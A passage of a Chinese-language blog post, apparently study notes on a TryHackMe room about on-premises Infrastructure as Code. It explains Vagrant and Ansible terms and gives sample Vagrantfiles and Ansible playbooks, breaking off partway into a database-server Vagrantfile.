@@ -1,0 +1,579 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>On-PremisesIaCTHM | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction在这个房间里，您将了解本地基础设施即代码 (IaC) 部署。虽然这在基于云的世界中似乎已经过时，但进行本地部署而不是云部署确实有一些很好的理由，尤其是在受到严格监管的行业中。 先决条件  基本的进攻性安全技术和技能 IaC 简介  学习目标  了解本地 IaC 的原因 了解本地 IaC 的优点和缺点 理解并知道如何使用 Vagrant 理解并知道如何使用 Ansible 了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="On-PremisesIaCTHM">
+<meta property="og:url" content="https://blog.mikannse.cn/2025/03/24/On-PremisesIaCTHM/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="Introduction在这个房间里，您将了解本地基础设施即代码 (IaC) 部署。虽然这在基于云的世界中似乎已经过时，但进行本地部署而不是云部署确实有一些很好的理由，尤其是在受到严格监管的行业中。 先决条件  基本的进攻性安全技术和技能 IaC 简介  学习目标  了解本地 IaC 的原因 了解本地 IaC 的优点和缺点 理解并知道如何使用 Vagrant 理解并知道如何使用 Ansible 了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2025-03-24T14:11:34.000Z">
+<meta property="article:modified_time" content="2025-03-24T14:24:10.109Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="DevSecOps">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://blog.mikannse.cn/2025/03/24/On-PremisesIaCTHM/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'On-PremisesIaCTHM',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2025-03-24 22:24:10'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">319</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">On-PremisesIaCTHM</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-24T14:11:34.000Z" title="发表于 2025-03-24 22:11:34">2025-03-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-24T14:24:10.109Z" title="更新于 2025-03-24 22:24:10">2025-03-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>26分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="On-PremisesIaCTHM"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在这个房间里，您将了解本地基础设施即代码 (IaC) 部署。虽然这在基于云的世界中似乎已经过时，但进行本地部署而不是云部署确实有一些很好的理由，尤其是在受到严格监管的行业中。</p>
+<p>先决条件</p>
+<ul>
+<li>基本的进攻性安全技术和技能</li>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/introtoiac">IaC 简介</a></li>
+</ul>
+<p>学习目标</p>
+<ul>
+<li>了解本地 IaC 的原因</li>
+<li>了解本地 IaC 的优点和缺点</li>
+<li>理解并知道如何使用 Vagrant</li>
+<li>理解并知道如何使用 Ansible</li>
+<li>了解 Ansible 和 Vagrant 的安全问题</li>
+</ul>
+<h1 id="Why-On-Premises"><a href="#Why-On-Premises" class="headerlink" title="Why On-Premises"></a>Why On-Premises</h1><p>本地 IaC 是指使用基础设施即代码在内部网络上部署系统和服务。本质上，所有将托管系统和服务的基础设施都可以在组织的数据中心本地找到。</p>
+<p>采用本地 IaC 的原因</p>
+<p>在当今世界，我们拥有多家云提供商，使用本地 IaC 似乎违反直觉。但是，在某些情况下，本地 IaC 更适合您的需求。最大的好处是它可以让您更好地控制整个 IaC 管道。让我们使用另一个流行的例子，GitHub 与自托管 GitLab，作为案例研究。</p>
+<p>GitHub 和 GitLab 是两个流行的源代码管理平台，由流行的版本控制软件 Git 支持，被组织广泛使用。然而，在两者之间做出选择往往成为一个控制问题。如果您使用 GitLab 自托管解决方案，则可以完全控制整个堆栈。您最终不仅要负责 GitLab 平台的管理，还要负责底层基础设施的管理。虽然这需要做更多的工作，但它也允许您显著地锁定访问权限。例如，您只能允许通过 VPN 访问您的 GitLab 实例，这意味着它不会向所有人公开。</p>
+<p>相反，使用 GitHub 意味着你正在转移部分安全责任。重要的是要记住，GitHub 是一种软件即服务 (SaaS) 解决方案。这意味着，如果你使用 GitHub，你就无法控制托管源代码的基础设施。相反，你正在将基础设施管理的安全责任转移给 GitHub，后者成为你组织的第三方。虽然这些组织非常重视安全措施，但他们的安全性并非没有缺陷，这可能会使你组织的源代码暴露在外。每当你使用第三方时，你都必须接受这种风险。</p>
+<p>从这个案例研究中推断，您应该明白为什么一些组织仍然喜欢本地 IaC，尤其是在监管严格的行业，例如金融或政府部门。虽然本地 IaC 肯定需要付出更多努力，但它为组织提供了对其 IaC 管道的完全控制和定制。</p>
+<p>优点和缺点</p>
+<p>为了总结为什么要使用内部部署 IaC 并确定它是否是针对您的特定问题的正确解决方案，让我们来看看它的优点和缺点。</p>
+<p><strong>本地 IaC 具有以下优势：</strong></p>
+<ul>
+<li>允许完全控制 IaC 管道</li>
+<li>IaC 管道可以根据您的具体需求进行完全定制</li>
+<li>由于 IaC 管道不托管第三方系统上的资源，因此数据保护和监管更容易执行</li>
+<li>虽然基础设施的初始投资成本很高，但托管 IaC 管道无需每月付费</li>
+<li>小型部署通常更容易</li>
+</ul>
+<p><strong>本地 IaC 有以下缺点：</strong></p>
+<ul>
+<li>由于您托管自己的 IaC 管道，因此您对其安全性和配置负全部责任</li>
+<li>部署的可扩展性不如基于云的 IaC 灵活，这可能导致部署资源不足或资源投资过度</li>
+<li>本地 IaC 的初始投资明显高于基于云的 IaC</li>
+</ul>
+<p>现在您了解了为什么可以使用本地 IaC，让我们深入了解一些可用于创建您自己的本地 IaC 的工具。虽然可以使用许多不同的工具和软件，但在这个房间里，我们将重点关注 Vagrant 和 Ansible 作为示例。</p>
+<h1 id="Vagrant-Basics"><a href="#Vagrant-Basics" class="headerlink" title="Vagrant Basics"></a>Vagrant Basics</h1><p>在我们的本地 IaC 之旅中，我们将从 <a target="_blank" rel="noopener" href="https://developer.hashicorp.com/vagrant">Vagrant</a> 开始。Vagrant 是一种软件解决方案，可用于构建和维护可移植的虚拟软件开发环境。本质上，Vagrant 可用于从 IaC 管道创建资源。您可以将 Vagrant 视为 Docker 的老大哥。在 Vagrant 的上下文中，Docker 将被视为提供者，这意味着 Vagrant 不仅可用于部署 Docker 实例，还可用于部署托管它们的实际服务器。</p>
+<p>术语</p>
+<p>在深入使用 Vagrant 之前，让我们先了解一些术语。</p>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Provider</td>
+<td>Vagrant 提供程序是一种虚拟化技术，将用于配置 IaC 部署。Vagrant 可以使用不同的提供程序，例如 Docker、VirtualBox、VMware 甚至 AWS 进行基于云的部署。</td>
+</tr>
+<tr>
+<td>Provision</td>
+<td>Provision 是指使用 Vagrant 执行操作。这可以是添加新文件或运行脚本来配置使用 Vagrant 创建的主机等操作。</td>
+</tr>
+<tr>
+<td>Configure</td>
+<td>配置用于使用 Vagrant 执行配置更改。可以通过向主机添加网络接口或更改其主机名来更改配置。</td>
+</tr>
+<tr>
+<td>Variable</td>
+<td>变量存储了一些将在 Vagrant 部署脚本中使用的值。</td>
+</tr>
+<tr>
+<td>Box</td>
+<td>Box 指的是 Vagrant 将提供的图像。</td>
+</tr>
+<tr>
+<td>Vagrantfile</td>
+<td>Vagrantfile 是 Vagrant 将读取和执行的配置文件。</td>
+</tr>
+</tbody></table>
+<p>Vagrant 示例</p>
+<p>让我们看一个简单的 Vagrant 配置脚本。在我们的示例中，我们有以下文件夹结构：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── provision</span><br><span class="line">│   ├── files.zip</span><br><span class="line">│   └── script.sh</span><br><span class="line">└── Vagrantfile</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Vagrantfile 脚本包含以下代码：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">Vagrant.configure(<span class="string">"2"</span>) <span class="keyword">do</span> |cfg|</span><br><span class="line">  cfg.vm.define <span class="string">"server"</span> <span class="keyword">do</span> |config|</span><br><span class="line">    config.vm.box = <span class="string">"ubuntu/bionic64"</span></span><br><span class="line">    config.vm.hostname = <span class="string">"testserver"</span></span><br><span class="line">    config.vm.provider :virtualbox <span class="keyword">do</span> |v, override|</span><br><span class="line">       v.gui = <span class="literal">false</span> </span><br><span class="line">       v.cpus = <span class="number">1</span></span><br><span class="line">       v.memory = <span class="number">4096</span></span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    config.vm.network :private_network,</span><br><span class="line">        :ip =&gt; <span class="number">172.16</span><span class="number">.2</span><span class="number">.101</span></span><br><span class="line">    config.vm.network :private_network,</span><br><span class="line">        :ip =&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.101</span></span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  cfg.vm.define <span class="string">"server2"</span> <span class="keyword">do</span> |config|</span><br><span class="line">    config.vm.box = <span class="string">"ubuntu/bionic64"</span></span><br><span class="line">    config.vm.hostname = <span class="string">"testserver2"</span></span><br><span class="line">    config.vm.provider :virtualbox <span class="keyword">do</span> |v, override|</span><br><span class="line">       v.gui = <span class="literal">false</span> </span><br><span class="line">       v.cpus = <span class="number">2</span></span><br><span class="line">       v.memory = <span class="number">4096</span></span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    #Upload resources</span><br><span class="line">    config.vm.provision <span class="string">"file"</span>, source: <span class="string">"provision/files.zip"</span>,    destination: <span class="string">"/tmp/files.zip"</span></span><br><span class="line"></span><br><span class="line">    #Run script</span><br><span class="line">    config.vm.provision <span class="string">"shell"</span>, path: <span class="string">"provision/script.sh"</span></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在此示例中，我们将配置两台服务器。这两台服务器都将从基础 Ubuntu Bionic x64 映像开始。与 Docker 一样，这些映像将从公共映像存储库中提取。但是，我们可以告诉 Vagrant 在哪里找到这些映像，这意味着它们也可以从私有映像存储库中提取。您可以看到两台服务器都配置了主机名以及每台主机将拥有多少个 CPU（1）和 RAM（4GB）。第一台服务器还将有两个附加了静态 IP 的网络接口。第二台服务器将上传一个名为“files.zip”的文件，并在主机上执行一个名为“script.sh”的脚本。</p>
+<p>如果我们想要配置整个脚本，我们将使用命令“vagrant up”。这将按照 Vagrantfile 中指定的顺序配置两台服务器。我们还可以决定仅使用服务器名称配置其中一台服务器。例如，可以使用“vagrant up server”配置“testserver”。</p>
+<p>如果您想使用 Vagrant 尝试 VirtualBox 配置，请查看此 <a target="_blank" rel="noopener" href="https://github.com/MWR-CyberSec/tabletop-lab-creation">repo</a>。使用 VirtualBox 和 Vagrant，此 repo 将允许您创建自己的 Active Directory (AD) 网络，其中包含两个域控制器、一个服务器和一个工作站。阅读 Vagrantfile 以查看将在每个主机上执行哪些配置。</p>
+<p>稍后我们将在此房间中创建我们自己的 IaC 部署脚本。</p>
+<h1 id="Ansible-Basics"><a href="#Ansible-Basics" class="headerlink" title="Ansible Basics"></a>Ansible Basics</h1><p>下一个要了解的 IaC 工具是 <a target="_blank" rel="noopener" href="https://www.ansible.com/">Ansible</a>。与 Vagrant 一样，Ansible 是另一套允许您执行 IaC 的软件工具。Ansible 也是开源的，因此成为 IaC 管道和部署的热门选择。Ansible 和 Vagrant 之间的一个主要区别是 Ansible 对执行的步骤执行版本控制。这意味着 Ansible 与 Docker 类似，因为它只会对需要更新的步骤执行更新，而不是要求完全重新配置。</p>
+<p>术语</p>
+<p>在深入使用 Ansible 之前，让我们先复习一下一些术语。</p>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Playbook</td>
+<td>Ansible 剧本是一个 YAML 文件，包含一系列将要执行的步骤。</td>
+</tr>
+<tr>
+<td>Template</td>
+<td>Ansible 允许创建模板文件。这些文件充当您的基础文件（如配置文件），其中包含 Ansible 变量的占位符，然后在运行时注入这些占位符以创建可部署到主机的最终文件。使用 Ansible 变量意味着您可以在单个位置更改变量的值，然后它将传播到配置中的所有占位符。</td>
+</tr>
+<tr>
+<td>Role</td>
+<td>Ansible 允许创建一组模板和指令，这些模板和指令随后被称为角色。然后可以为要配置的主机分配一个或多个这些角色，为主机执行整个模板。这样，您就可以通过一行配置重复使用角色定义，其中指定必须在主机上配置该角色。</td>
+</tr>
+<tr>
+<td>Variable</td>
+<td>变量存储一些将在 Ansible 部署脚本中使用的值。Ansible 可以更进一步，使用变量文件，每个文件对相同变量具有不同的值，然后在运行时决定使用哪个变量文件。</td>
+</tr>
+</tbody></table>
+<p>Ansible 示例</p>
+<p>Ansible 使用特定的文件夹和文件结构。结构中最重要的部分是剧本，这是一个 YAML 文件，它最终决定了将执行哪些命令进行配置。让我们看一下典型的文件夹结构：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── playbook.yml</span><br><span class="line">├── roles</span><br><span class="line">│   ├── common</span><br><span class="line">│   │   ├── defaults</span><br><span class="line">│   │   │   └── main.yml</span><br><span class="line">│   │   ├── tasks</span><br><span class="line">│   │   │   ├── apt.yml</span><br><span class="line">│   │   │   ├── main.yml</span><br><span class="line">│   │   │   ├── task1.yml</span><br><span class="line">│   │   │   ├── task2.yml</span><br><span class="line">│   │   │   └── yum.yml</span><br><span class="line">│   │   ├── templates</span><br><span class="line">│   │   │   ├── template1</span><br><span class="line">│   │   │   └── template2</span><br><span class="line">│   │   └── vars</span><br><span class="line">│   │       ├── Debian.yml</span><br><span class="line">│   │       └── RedHat.yml</span><br><span class="line">│   ├── role2</span><br><span class="line">│   ├── role3</span><br><span class="line">│   └── role4</span><br><span class="line">└── variables</span><br><span class="line">    └── var.yml</span><br></pre></td></tr></tbody></table></figure>
+
+<p>文件夹结构仅针对“common”角色进行了扩展。但是，同样的结构也适用于角色 2 至 3。</p>
+<p>让我们深入了解一下每个文件的作用。让我们从 playbook.yml 文件开始：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">---</span><br><span class="line">- name: Configure the server</span><br><span class="line">  hosts: all</span><br><span class="line">  become: yes</span><br><span class="line">  roles:</span><br><span class="line">    - common</span><br><span class="line">    - role3</span><br><span class="line">  vars_files:</span><br><span class="line">    - variables/var.yml</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们可以看到，剧本指定应该将 <code>common</code> 和 <code>role3</code> 角色应用于将执行此 Ansible 剧本的所有主机。它还将使用 <code>var.yml</code> 文件覆盖角色内的任何默认变量。这允许我们仅在需要时更改默认变量，因为默认值仍将应用于所有其他变量。</p>
+<p>要执行 <code>common</code> 角色，Ansible 将从 <code>defaults/main.yml</code> 文件中加载变量，并使用在 <code>var.yml</code> 文件中找到的任何新值覆盖这些变量。然后它将读取并执行 <code>tasks/main.yml</code> 文件。此文件看起来像这样：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">---</span><br><span class="line">- name: include OS specific variables</span><br><span class="line">  include_vars: <span class="string">"{{ item }}"</span></span><br><span class="line">  with_first_found:</span><br><span class="line">    - <span class="string">"{{ ansible_distribution }}.yml"</span></span><br><span class="line">    - <span class="string">"{{ ansible_os_family }}.yml"</span></span><br><span class="line"></span><br><span class="line">- name: <span class="built_in">set</span> root password</span><br><span class="line">  user:</span><br><span class="line">    name: root</span><br><span class="line">    password: <span class="string">"{{ root_password }}"</span></span><br><span class="line">  when: root_password is defined</span><br><span class="line"></span><br><span class="line">- include: apt.yml</span><br><span class="line">  when: ansible_os_family == <span class="string">"Debian"</span></span><br><span class="line"></span><br><span class="line">- include: yum.yml</span><br><span class="line">  when: ansible_os_family == <span class="string">"RedHat"</span></span><br><span class="line"></span><br><span class="line">- include: task1.yml</span><br><span class="line">- include: task2.yml</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Ansible 文件的第一部分将确定主机的操作系统发行版。然后，它将使用此信息来包含特定于操作系统的配置步骤。从我们的文件夹结构中可以看出，我们根据发行版是 Debian 还是 RedHat 制定了特定的配置步骤。剧本的第二部分将设置 root 用户的密码。在第三部分中，我们更新主机并安装一些软件包。但是，我们仅执行与操作系统发行版匹配的安装步骤。如果主机是 Debian，我们将执行 <code>apt.yml</code> 文件中指定的命令。如果主机是 RedHat，我们将执行 <code>yum.yml</code> 文件中指定的命令。这使我们的 Ansible 角色与操作系统发行版无关。最后，我们将执行 <code>task1.yml</code> 和 <code>task2.yml</code> 文件中包含的命令。这些命令可以是任何命令，例如向主机添加文件或进行配置更改。</p>
+<p>这些信息需要掌握很多，但当你开始使用这些工具并了解脚本何时执行时，就会明白很多。</p>
+<p>结合 Vagrant 和 Ansible</p>
+<p>虽然你可以坚持使用一个 IaC 工具来处理整个管道，但结合使用工具往往是有益的。例如，Vagrant 可用于主机的主要部署，而 Ansible 可用于主机特定的配置。这样，你只在想要从头开始重新创建整个网络时才使用 Vagrant，但仍可以使用 Ansible 进行主机特定的配置更改，直到需要完全重建。Ansible 随后将在每个主机上本地运行以执行这些配置更改，而 Vagrant 将从虚拟机管理程序本身执行。为了做到这一点，你可以在 Vagrantfile 中添加以下内容，告诉 Vagrant 配置 Ansible 剧本：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">config.vm.provision <span class="string">"ansible_local"</span> <span class="keyword">do</span> |ansible|</span><br><span class="line">    ansible.playbook = <span class="string">"provision/playbook.yml"</span></span><br><span class="line">    ansible.become = <span class="literal">true</span></span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果您只想坚持使用单一 IaC 解决方案，那么还值得注意的是 Vagrant 和 Ansible 之间的一些差异：</p>
+<table>
+<thead>
+<tr>
+<th><strong>Feature/Aspect</strong></th>
+<th><strong>Vagrant</strong></th>
+<th><strong>Ansible</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Configuration Language</strong></td>
+<td>Ruby (for Vagrantfiles).</td>
+<td>YAML (for Playbooks).</td>
+</tr>
+<tr>
+<td><strong>Integration with Other Tools</strong></td>
+<td>通常与 Chef、Puppet 或 Ansible 等配置工具一起使用。</td>
+<td>可以独立使用或与其他 CI/CD 工具集成。</td>
+</tr>
+<tr>
+<td><strong>Complexity</strong></td>
+<td>建立开发环境相对简单。</td>
+<td>更大的基础设施和更高级的配置具有更高的复杂性。</td>
+</tr>
+<tr>
+<td><strong>Scalability</strong></td>
+<td>更适合小规模、单独的开发环境。</td>
+<td>高度可扩展，适合管理复杂的多层应用程序。</td>
+</tr>
+<tr>
+<td><strong>Execution Model</strong></td>
+<td>具有顺序执行步骤的程序化风格。</td>
+<td>声明性模型，描述系统所需的状态。</td>
+</tr>
+</tbody></table>
+<p>现在我们已经了解了 Vagrant 和 Ansible，让我们利用这些知识构建我们自己的 IaC 管道！</p>
+<h1 id="Building-an-On-Prem-IaC-Workflow"><a href="#Building-an-On-Prem-IaC-Workflow" class="headerlink" title="Building an On-Prem IaC Workflow"></a>Building an On-Prem IaC Workflow</h1><p>Vagrantfile</p>
+<p>让我们先来看看 Vagrantfile：</p>
+<p>Vagrantfile</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">Vagrant.configure(<span class="string">"2"</span>) do |config|</span><br><span class="line">  <span class="comment"># DB server will be the backend for our website</span></span><br><span class="line">  config.vm.define <span class="string">"dbserver"</span>  do |cfg|</span><br><span class="line">    <span class="comment"># Configure the local network for the server</span></span><br><span class="line">    cfg.vm.network :private_network, <span class="built_in">type</span>: <span class="string">"dhcp"</span>, docker_network__internal: true</span><br><span class="line">    cfg.vm.network :private_network, ip: <span class="string">"172.20.128.3"</span>, netmask: <span class="string">"24"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Boot the Docker container and run Ansible</span></span><br><span class="line">    cfg.vm.provider <span 